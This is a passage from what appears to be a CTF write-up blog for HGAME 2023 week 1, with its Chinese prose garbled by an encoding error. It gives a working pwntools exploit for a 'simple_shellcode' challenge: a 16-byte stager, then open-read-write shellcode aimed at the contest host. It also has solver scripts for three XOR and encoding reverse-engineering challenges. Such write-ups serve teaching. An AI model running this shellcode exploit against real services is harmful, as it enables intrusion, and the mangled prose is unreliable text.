title="simple_shellcode"></a>simple_shellcode</h3><p>è¿™ç§<code>shellcode</code>é¢˜ç›®é™¤äº†æŒæ¡åŸºæœ¬çš„<code>orw_shellcode</code>å¤–ï¼Œè¦æ—¶åˆ»å…³æ³¨æ‰§è¡Œ<code>shellcode</code>å‰åçš„å¯„å­˜å™¨å˜åŒ–ï¼Œæ ¹æ®å¯„å­˜å™¨å†™<code>shellcode</code>ã€‚</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/218678/6/25270/21739/63b83fb5Fc42dc228/e207fa91b6c24ab5.png" style="zoom:80%;" /><ul><li>é¦–å…ˆ<code>shellcode</code>æœ‰<code>16</code>ä¸ªå­—èŠ‚å¤§å°çš„é™åˆ¶ï¼Œè¿™ä¹Ÿå°±æ„å‘³ç€æ¥ä¸‹æ¥æˆ‘ä»¬è¦ç”¨<code>16</code>ä¸ªå­—èŠ‚å¤§å°é™åˆ¶çš„<code>shellcode</code>æ‰©å¤§æ¼æ´åˆ©ç”¨èƒ½åŠ›ã€‚</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/157748/33/33698/56517/63b8408eFc10e2b83/c51017ea28f05343.png" style="zoom:80%;" /><ul><li>è°ƒè¯•å¹¶æ ¹æ®å¯„å­˜å™¨ç¼–å†™ä¸€ä¸‹<code>shellcode</code>ï¼Œç›®æ ‡æ˜¯å†™å…¥æ›´å¤šæ•°æ®åˆ°<code>0xcafe0000</code>è¿™ç‰‡ç©ºé—´å¹¶æ‰§è¡Œï¼š</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">shellcode1=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov rsi,rdx</span></span><br><span class="line"><span class="string">    mov edx,0x100</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    call rsi</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode1))</span><br></pre></td></tr></table></figure><ul><li>è€Œåå°±æ˜¯ç¼–å†™å¸¸è§„çš„<code>orw</code>çš„<code>shellcode</code>ï¼Œæ³¨æ„å¼€å¤´éœ€è¦å¤šå†™ä¸€äº›<code>nop</code>ï¼Œå¦åˆ™å†™å‡ºçš„å°±ä¸æ˜¯ç›®æ ‡<code>flag</code>ï¼ŒçŒœæµ‹æ˜¯æ§åˆ¶ç›¸å…³é—®é¢˜ï¼š</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">shellcode2=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">    mov rdi,rsp</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    push 2</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    mov edx,0x100</span></span><br><span class="line"><span class="string">    xor eax,eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov edi,1</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>æ€»çš„<code>exp</code>å¦‚ä¸‹ï¼š</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">rom pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;week-1.hgame.lwsec.cn&quot;</span>,<span class="number">31266</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode2=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">    mov rdi,rsp</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    push 2</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    mov edx,0x100</span></span><br><span class="line"><span class="string">    xor eax,eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov edi,1</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode1=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov rsi,rdx</span></span><br><span class="line"><span class="string">    mov edx,0x100</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    call rsi</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode1))</span><br><span class="line">io.send(shellcode1)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.send(shellcode2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="easyasm"><a href="#easyasm" class="headerlink" title="easyasm"></a>easyasm</h3><p>æ ¹æ®æ±‡ç¼–æ‰¾é€»è¾‘ï¼Œåˆ†æå®Œå‘ç°åªæ˜¯ç®€å•çš„å¼‚æˆ–ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">; void __cdecl enc(char *p)</span><br><span class="line">.text:00401160 _enc            proc near               ; CODE XREF: _main+1Bâ†‘p</span><br><span class="line">.text:00401160</span><br><span class="line">.text:00401160 i               = dword ptr -4</span><br><span class="line">.text:00401160 Str             = dword ptr  8</span><br><span class="line">.text:00401160</span><br><span class="line">.text:00401160                 push    ebp</span><br><span class="line">.text:00401161                 mov     ebp, esp</span><br><span class="line">.text:00401163                 push    ecx</span><br><span class="line">.text:00401164                 mov     [ebp+i], 0</span><br><span class="line">.text:0040116B                 jmp     short loc_401176</span><br><span class="line">.text:0040116D ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040116D</span><br><span class="line">.text:0040116D loc_40116D:                             ; CODE XREF: _enc+3Bâ†“jiè‡ªå¢</span><br><span class="line">.text:0040116D                 mov     eax, [ebp+i]</span><br><span class="line">.text:00401170                 add     eax, 1</span><br><span class="line">.text:00401173                 mov     [ebp+i], eax</span><br><span class="line">.text:00401176</span><br><span class="line">.text:00401176 loc_401176:                             ; CODE XREF: _enc+Bâ†‘j</span><br><span class="line">.text:00401176                 mov     ecx, [ebp+Str]</span><br><span class="line">.text:00401179                 push    ecx             ; Str</span><br><span class="line">.text:0040117A                 call    _strlen; è¿”å›Strçš„é•¿åº¦è‡³eax</span><br><span class="line">.text:0040117F                 add     esp, 4</span><br><span class="line">.text:00401182                 cmp     [ebp+i], eax; iä¸len(Str)æ¯”è¾ƒ</span><br><span class="line">.text:00401185                 jge     short loc_40119D; å¤§åˆ™è·³å‡ºå¾ªç¯</span><br><span class="line">.text:00401187                 mov     edx, [ebp+Str]</span><br><span class="line">.text:0040118A                 add     edx, [ebp+i]</span><br><span class="line">.text:0040118D                 movsx   eax, byte ptr [edx]; movsx å¸¦ç¬¦å·æ‰©å±•ä¼ é€</span><br><span class="line">.text:00401190                 xor     eax, 33h; å¼‚æˆ–åŠ å¯†</span><br><span class="line">.text:00401193                 mov     ecx, [ebp+Str]</span><br><span class="line">.text:00401196                 add     ecx, [ebp+i]</span><br><span class="line">.text:00401199                 mov     [ecx], al</span><br><span class="line">.text:0040119B                 jmp     short loc_40116D</span><br><span class="line">.text:0040119D ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040119D</span><br><span class="line">.text:0040119D loc_40119D:                             ; CODE XREF: _enc+25â†‘j</span><br><span class="line">.text:0040119D                 mov     esp, ebp</span><br><span class="line">.text:0040119F                 pop     ebp</span><br><span class="line">.text:004011A0                 retn</span><br><span class="line">.text:004011A0 _enc            endp</span><br><span class="line">Input: your flag</span><br><span class="line">Encrypted result: 0x5b,0x54,0x52,0x5e,0x56,0x48,0x44,0x56,0x5f,0x50,0x3,0x5e,0x56,0x6c,0x47,0x3,0x6c,0x41,0x56,0x6c,0x44,0x5c,0x41,0x2,0x57,0x12,0x4e</span><br></pre></td></tr></table></figure><p><code>exp</code>å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">data=[<span class="number">0x5b</span>,<span class="number">0x54</span>,<span class="number">0x52</span>,<span class="number">0x5e</span>,<span class="number">0x56</span>,<span class="number">0x48</span>,<span class="number">0x44</span>,<span class="number">0x56</span>,<span class="number">0x5f</span>,<span class="number">0x50</span>,<span class="number">0x3</span>,<span class="number">0x5e</span>,<span class="number">0x56</span>,<span class="number">0x6c</span>,<span class="number">0x47</span>,<span class="number">0x3</span>,<span class="number">0x6c</span>,<span class="number">0x41</span>,<span class="number">0x56</span>,<span class="number">0x6c</span>,<span class="number">0x44</span>,<span class="number">0x5c</span>,<span class="number">0x41</span>,<span class="number">0x2</span>,<span class="number">0x57</span>,<span class="number">0x12</span>,<span class="number">0x4e</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i^<span class="number">0x33</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># hgame&#123;welc0me_t0_re_wor1d!&#125;</span></span><br></pre></td></tr></table></figure><h3 id="easyenc"><a href="#easyenc" class="headerlink" title="easyenc"></a>easyenc</h3><p>ç®€å•çš„åŠ å¯†æ‰‹æ³•ï¼Œæ‰¾åˆ°<code>you are right</code>ç®€å•åˆ†æå³å¯ï¼Œå¦‚æœä¸æ˜¯<code>exe</code>æ–‡ä»¶çš„è¯è¿˜æƒ³è¯•è¯•<code>angr</code>ä¸€æŠŠæ¢­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// al</span></span><br><span class="line">  <span class="type">char</span> *v6; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> v8[<span class="number">10</span>]; <span class="comment">// [rsp+20h] [rbp-19h]</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// [rsp+48h] [rbp+Fh]</span></span><br><span class="line">  __int128 v10[<span class="number">3</span>]; <span class="comment">// [rsp+50h] [rbp+17h] BYREF</span></span><br><span class="line">  __int16 v11; <span class="comment">// [rsp+80h] [rbp+47h]</span></span><br><span class="line"></span><br><span class="line">  v8[<span class="number">0</span>] = <span class="number">0x9FDFF04</span>;</span><br><span class="line">  v8[<span class="number">1</span>] = <span class="number">0xB0F301</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v8[<span class="number">2</span>] = <span class="number">0xADF00500</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v10, <span class="number">0</span>, <span class="keyword">sizeof</span>(v10));</span><br><span class="line">  v3 = <span class="number">0</span>i64;</span><br><span class="line">  v8[<span class="number">3</span>] = <span class="number">0x5170607</span>;</span><br><span class="line">  v8[<span class="number">4</span>] = <span class="number">0x17FD17EB</span>;</span><br><span class="line">  v8[<span class="number">5</span>] = <span class="number">0x1EE01EA</span>;</span><br><span class="line">  v8[<span class="number">6</span>] = <span class="number">0xFA05B1EA</span>;</span><br><span class="line">  v8[<span class="number">7</span>] = <span class="number">0xAC170108</span>;</span><br><span class="line">  v8[<span class="number">8</span>] = <span class="number">0xFDEA01EC</span>;</span><br><span class="line">  v8[<span class="number">9</span>] = <span class="number">0x60705F0</span>;</span><br><span class="line">  v9 = <span class="number">0xF9</span>;</span><br><span class="line">  sub_140001064(<span class="string">&quot;%50s&quot;</span>, v10);</span><br><span class="line">  v4 = <span class="number">-1</span>i64;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    ++v4;</span><br><span class="line">  <span class="keyword">while</span> ( *(v10 + v4) );</span><br><span class="line">  <span class="keyword">if</span> ( v4 != <span class="number">41</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = (*(v10 + v3) ^ <span class="number">0x32</span>) - <span class="number">86</span>;</span><br><span class="line">    *(v10 + v3) = v5;</span><br><span class="line">    <span class="keyword">if</span> ( *(v8 + v3) != v5 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( ++v3 &gt;= <span class="number">41</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="string">&quot;you are right!&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v6 = <span class="string">&quot;wrong!&quot;</span>;</span><br><span class="line">LABEL_8:</span><br><span class="line">  sub_140001010(v6);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>exp</code>å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">data=[<span class="number">0x04</span>, <span class="number">0xFF</span>, <span class="number">0xFD</span>, <span class="number">0x09</span>, <span class="number">0x01</span>, <span class="number">0xF3</span>, <span class="number">0xB0</span>, <span class="number">0x00</span>,</span><br><span class="line">      <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0xF0</span>, <span class="number">0xAD</span>, <span class="number">0x07</span>, <span class="number">0x06</span>, <span class="number">0x17</span>, <span class="number">0x05</span>,</span><br><span class="line">      <span class="number">0xEB</span>, <span class="number">0x17</span>, <span class="number">0xFD</span>, <span class="number">0x17</span>, <span class="number">0xEA</span>, <span class="number">0x01</span>, <span class="number">0xEE</span>, <span class="number">0x01</span>,</span><br><span class="line">      <span class="number">0xEA</span>, <span class="number">0xB1</span>, <span class="number">0x05</span>, <span class="number">0xFA</span>, <span class="number">0x08</span>, <span class="number">0x01</span>, <span class="number">0x17</span>, <span class="number">0xAC</span>,</span><br><span class="line">      <span class="number">0xEC</span>, <span class="number">0x01</span>, <span class="number">0xEA</span>, <span class="number">0xFD</span>, <span class="number">0xF0</span>, <span class="number">0x05</span>, <span class="number">0x07</span>, <span class="number">0x06</span>,</span><br><span class="line">      <span class="number">0xF9</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(((i+<span class="number">86</span>)%<span class="number">256</span>)^<span class="number">0x32</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># hgame&#123;4ddit1on_is_a_rever5ible_0peration&#125;</span></span><br></pre></td></tr></table></figure><h3 id="encode"><a href="#encode" class="headerlink" title="encode"></a>encode</h3><p>å°†ä¸€ä¸ªæ•°åˆ†å¼€äºŒæ¬¡åŠ å¯†è®°å½•ï¼Œä¸€ä¸ªè®¡ç®—<code>%16</code>çš„ä½™æ•°ï¼Œå¦ä¸€ä¸ªè®¡ç®—<code>/16</code>çš„æ•´æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4[<span class="number">100</span>]; <span class="comment">// [esp+0h] [ebp-1CCh] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">52</span>]; <span class="comment">// [esp+190h] [ebp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [esp+1C4h] [ebp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+1C8h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="number">0x32</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="keyword">sizeof</span>(v4));</span><br><span class="line">  sub_4011A0(<span class="string">&quot;%50s&quot;</span>, v5);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">50</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4[<span class="number">2</span> * i] = v5[i] &amp; <span class="number">0xF</span>;</span><br><span class="line">    v4[<span class="number">2</span> * i + <span class="number">1</span>] = (v5[i] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">100</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4[j] != dword_403000[j] )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_401160(Format, v4[<span class="number">0</span>]);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_401160(aYesYouAreRight, v4[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>exp</code>å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">result=[<span class="number">8</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>,</span><br><span class="line">        <span class="number">11</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">6</span>,</span><br><span class="line">        <span class="number">4</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">7</span>,</span><br><span class="line">        <span class="number">15</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">7</span>,</span><br><span class="line">        <span class="number">15</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">5</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">7</span>,</span><br><span class="line">        <span class="number">5</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">5</span>,</span><br><span class="line">        <span class="number">5</span>, <span class="number">6</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">14</span>, <span class="number">6</span>,</span><br><span class="line">        <span class="number">5</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">flag=[<span class="number">0</span>]*<span class="number">50</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    result[<span class="number">2</span>*i]=result[<span class="number">2</span>*i] &amp; <span class="number">0xf</span></span><br><span class="line">    result[<span class="number">2</span>*i+<span class="number">1</span>]=(result[<span class="number">2</span>*i+<span class="number">1</span>] &amp; <span class="number">0xf</span>) &lt;&lt; <span class="number">4</span></span><br><span class="line">    flag[i]=result[<span class="number">2</span>*i]+result[<span class="number">2</span>*i+<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># hgame&#123;encode_is_easy_for_a_reverse_engineer&#125;</span></span><br></pre></td></tr></table></figure><h1 id="WEEK2"><a href="#WEEK2" class="headerlink" title="WEEK2"></a>WEEK2</h1><h2 id="pwn-1"><a href="#pwn-1" class="headerlink" title="pwn"></a>pwn</h2><h3 id="YukkuriSay"><a href="#YukkuriSay" class="headerlink" 